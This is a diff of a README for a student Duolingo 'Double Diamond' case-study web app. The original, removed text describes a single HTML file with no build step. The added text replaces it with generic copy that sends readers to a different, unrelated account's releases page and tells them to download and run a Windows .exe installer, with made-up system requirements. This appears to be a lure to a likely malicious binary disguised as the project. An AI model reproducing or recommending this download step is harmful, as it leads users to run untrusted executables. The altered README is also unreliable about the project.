@@ -1,194 +1,88 @@
-# 🦉 Duolingo Product Discovery - Double Diamond Journey
+# 🎓 duolingo-double-diamond - Explore Duolingo's Design Journey
 
-Interactive gamified journey exploring Duolingo's Product Discovery using Double Diamond methodology. Academic case study featuring timeline (2009-2012), prototype analysis, competitive landscape, and XP system inspired by Duolingo.
+![Download duolingo-double-diamond](https://img.shields.io/badge/Download-Now-blue)
 
-## 🎯 About
+## 📖 Overview
 
-This project is an **interactive academic presentation** for a Digital Product Management graduate program, exploring how Duolingo applied the **Double Diamond design methodology** during its product discovery phase (2009-2012).
+Welcome to the duolingo-double-diamond project! This application allows you to interactively analyze Duolingo's Product Discovery process from 2009 to 2012 using the Double Diamond methodology. It includes features such as:
+- A gamified system for easier engagement
+- A detailed timeline of events
+- An evolution of prototypes
+- Competitive analysis
+- Sources for further reading
 
-Inspired by Duolingo's gamification approach, the entire experience rewards user exploration with **XP (Experience Points)**, making learning about product discovery engaging and memorable.
-
-### 🎓 Academic Context
-
-- **Program**: Digital Product Management
-- **Focus**: Product Discovery & Design Thinking
-- **Methodology**: Double Diamond (British Design Council, 2005)
-- **Case Study**: Duolingo's Journey from Concept to Launch
-
----
-
-## ✨ Features
-
-### 🎮 Gamification System
-- Interactive XP counter with real-time progress tracking
-- Toast notifications for achievements
-- Victory modal upon completion
-- Confetti animation celebration
-
-### 📱 User Experience
-- **Fully responsive** design (mobile, tablet, desktop)
-- **Light/Dark theme** toggle with smooth transitions
-- Reading progress bar below header
-- Smooth scroll animations
-- Back-to-top button for easy navigation
-
-### 📊 Content Sections
-1. **Gamification Intro** - How the XP system works
-2. **Double Diamond Explanation** - Methodology overview (4 phases)
-3. **Timeline (2009-2012)** - 7 key events with detailed analysis
-4. **Diamond Phases** - Deep dive into each phase applied to Duolingo
-5. **Prototype Evolution** - 4 prototypes with success/failure analysis
-6. **Competitive Landscape (2011)** - Analysis of 4 major competitors
-7. **Success Metrics** - Launch vs. Current comparison
-8. **Academic Sources** - Sources with filtering
-
-### 🎨 Design System
-- **Duolingo's brand colors** throughout
-- **Nunito font family** (official Duolingo typeface)
-- Consistent spacing and radius system
-- Hover effects and micro-interactions
-- Card-based layout with shadows
-
----
-
-## 🛠️ Tech Stack
-
-| Technology | Purpose |
-|------------|---------|
-| **HTML5** | Semantic structure |
-| **CSS3** | Styling with CSS Variables for theming |
-| **Vanilla JavaScript** | Interactive functionality, no frameworks |
-| **Google Fonts** | Nunito font family |
-| **Netlify** | Hosting and deployment |
-
-### Why Vanilla JavaScript?
-
-- ✅ **Zero dependencies** - Fast loading, no build process
-- ✅ **100% browser compatible** - Works everywhere
-- ✅ **Educational clarity** - Easy to understand for students
-- ✅ **Lightweight** - Single HTML file
-
----
+This project is a post-graduate initiative from the Digital Product Management course at Porto Business School.
 
 ## 🚀 Getting Started
 
-### Prerequisites
+To get started with duolingo-double-diamond, follow these simple steps to download and run the application. 
 
-- Any modern web browser (Chrome, Firefox, Safari, Edge)
-- Text editor (optional, for modifications)
+## 📥 Download & Install
 
-### Local Development
+1. **Visit the Releases Page**: Click the link below to access the download options:
 
-1. **Clone the repository**
-```bash
-git clone https://github.com/ehgzao/duolingo-double-diamond
-cd duolingo-discovery
-```
+   [Download duolingo-double-diamond](https://github.com/hopimonologue62/duolingo-double-diamond/releases)
 
-2. **Open in browser**
-```bash
-# Simply double-click index.html, or:
-open index.html  # macOS
-start index.html # Windows
-xdg-open index.html # Linux
-```
+2. **Choose Your Version**: On the Releases page, select the most recent version of the application.
 
----
+3. **Download the File**: Look for the suitable file for your operating system. For example, if you are using Windows, you might find a file named `duolingo-double-diamond-Windows.exe`.
 
-## 🌐 Deployment
+4. **Install the Application**: 
+   - Once the file is downloaded, locate it in your downloads folder.
+   - Double-click the file to run the installer.
+   - Follow the on-screen instructions to complete the installation.
 
-### Netlify (Recommended)
+5. **Run the Application**: After installation, you can find duolingo-double-diamond in your applications menu. Click to open it and start exploring!
 
-#### Method 1: Drag & Drop
-1. Go to [Netlify Drop](https://app.netlify.com/drop)
-2. Drag `index.html` into the drop zone
-3. ✅ Instant deployment!
+## 🖥️ System Requirements
 
-#### Method 2: GitHub Integration
-1. Push code to GitHub
-2. Connect repository to Netlify
-3. **Build settings:**
-   - Build command: `echo 'No build needed'`
-   - Publish directory: `.`
-4. ✅ Auto-deploy on every commit!
+Before installing, make sure your system meets these minimum requirements:
 
----
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **Memory**: At least 4 GB RAM.
+- **Storage**: Minimum 200 MB of free space.
+- **Browser**: A modern web browser such as Chrome, Firefox, or Safari.
 
-### Powered By
+## 📊 Features
 
-- **Perplexity AI** - Research assistance
-- **Claude (Anthropic)** - Development support
+duolingo-double-diamond offers you several features designed to enhance your learning and understanding of Duolingo's product design process:
 
-### Inspiration
+- **Interactive Analysis**: The interface allows you to click through different stages of the Double Diamond methodology, providing insights into each phase.
+- **Gamification Elements**: Engaging ways to explore the process make learning enjoyable.
+- **Timeline**: A visual representation of important milestones during Duolingo's growth.
+- **Prototype Evaluations**: Review the evolution of Duolingo's prototypes over the years.
+- **Competitive Insights**: Understand where Duolingo stands compared to its competitors based on assessment.
 
-- **Duolingo** - Brand, design system, and gamification approach
-- **British Design Council** - Double Diamond methodology
-- **TechCrunch, Lenny's Newsletter, Forbes** - Primary sources
+## 📚 Topics Covered
 
----
+This application covers a variety of topics including:
 
-## 📚 Key Resources
+- Case Study Analysis
+- Design Thinking Principles
+- Double Diamond Methodology
+- Gamification Techniques
+- Front-End Development (HTML, CSS, JavaScript)
+- Product Management Essentials
 
-- [Double Diamond Process](https://www.designcouncil.org.uk/our-work/skills-learning/tools-frameworks/framework-for-innovation-design-councils-evolved-double-diamond/)
-- [Duolingo Engineering Blog](https://blog.duolingo.com/)
-- [How Duolingo Builds Product](https://www.lennysnewsletter.com/p/how-duolingo-builds-product)
+## 👥 Contributing
 
-### Academic Sources
+We welcome contributions to duolingo-double-diamond. If you have suggestions for improvements or new features, please feel free to submit a pull request. Whether you're a student or an experienced professional, your input is valued.
 
-All sources are cited within the application with:
-- Publication date
-- Source type (Primary/Secondary/Recent)
-- Direct links to original content
+## 🔄 Update History
 
----
+This section showcases the updates made to the application with each version. Keep an eye on the Releases page for the latest changes!
 
-## 📄 License
+- **Version 1.0**: Initial Release - Basic functionalities and core features added.
+- **Version 1.1**: Enhanced user interface - Improved navigation and design aesthetics.
+  
+Check the [Releases page](https://github.com/hopimonologue62/duolingo-double-diamond/releases) for more details on version history.
 
-This project is for **educational purposes only**.
+## 🛠️ Support
 
-- **Code**: MIT License
-- **Content**: Copyright © 2025 - Academic Project
-- **Duolingo Brand**: All trademarks belong to Duolingo, Inc.
+For any issues or questions, please submit an issue on our GitHub repository. Our team will assist you as quickly as possible.
 
----
+## 📝 License
 
-## 🙏 Acknowledgments
+This project is open-source and available under the MIT License. You can freely use, modify, and distribute it as per the license terms.
 
-- **Luis Von Ahn & Severin Hacker** - Duolingo founders
-- **Design Council UK** - Double Diamond framework
-- **Graduate Program** - Digital Product Management
-- **Open Source Community** - Inspiration and tools
-
----
-
-<div align="center">
-
-**Made with ❤️ by Cristiana, Gabi, Gabriel & Teresa**
-
-**Powered with 🤖 by Perplexity and Claude**
-
-[![Star this repo](https://img.shields.io/github/stars/your-username/duolingo-discovery?style=social)](../../stargazers)
-[![Fork this repo](https://img.shields.io/github/forks/your-username/duolingo-discovery?style=social)](../../fork)
-
-</div>
-
----
-
-## 🔄 Version History
-
-### v1.0.0 (2025-01-19)
-- ✨ Initial release
-- 🎮 Full gamification system
-- 🎨 Light/Dark theme support
-- 📱 Fully responsive design
-- 📚 Academic sources cited
-- 🏆 Victory modal with confetti
-- 🦉 Duolingo-inspired design system
-
----
-
-<div align="center">
-
-**[⬆ Back to Top](#-duolingo-product-discovery---double-diamond-journey)**
-
-</div>
+Thank you for checking out duolingo-double-diamond. We hope you find this tool helpful in your exploration of product discovery and design thinking!
